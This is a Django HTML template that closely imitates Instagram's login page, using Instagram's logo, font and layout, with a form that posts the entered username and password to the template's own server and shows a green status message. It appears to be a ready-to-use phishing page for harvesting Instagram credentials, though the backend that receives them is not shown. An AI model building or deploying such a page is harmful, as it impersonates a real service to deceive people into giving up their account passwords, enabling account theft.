<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login</title>
  <!-- Load Google Font for logo text -->
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
  <style>
    body {
      background: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .login-box {
      width: 350px;
      padding: 40px;
      background: #fff;
      border: 1px solid #dbdbdb;
      text-align: center;
      box-shadow: 0 0 5px rgba(0,0,0,0.05);
      margin-bottom: 10px;
    }
    .logo-image {
      width: 100px;
      margin-bottom: 10px;
    }
    .logo-text {
      font-family: 'Grand Hotel', cursive;
      font-size: 50px;
      color: #262626;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #3897f0;
      color: white;
      border: none;
      border-radius: 3px;
      cursor: pointer;
      font-weight: bold;
      margin-top: 10px;
      font-size: 14px;
    }
    .links {
      margin-top: 15px;
    }
    .links a {
      text-decoration: none;
      color: #00376b;
      font-size: 12px;
    }
    .signup-box {
      width: 350px;
      padding: 20px;
      background: #fff;
      border: 1px solid #dbdbdb;
      text-align: center;
      font-size: 14px;
    }
    .signup-box a {
      text-decoration: none;
      color: #3897f0;
      font-weight: bold;
    }
    .message {
      color: green;
      font-size: 12px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" alt="Instagram Logo" class="logo-image" />
      <div class="logo-text">Instagram</div>
      <form method="POST">
        {% csrf_token %}
        <input type="text" name="username" placeholder="Phone number, username, or email" required/>
        <input type="password" name="password" placeholder="Password" required/>
        <button type="submit">Log In</button>
        {% if message %}
        <div class="message">{{ message }}</div>
        {% endif %}
      </form>
      <div class="links">
        <a href="#">Forgot password?</a>
      </div>
    </div>
    <div class="signup-box">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>
</body>
</html>
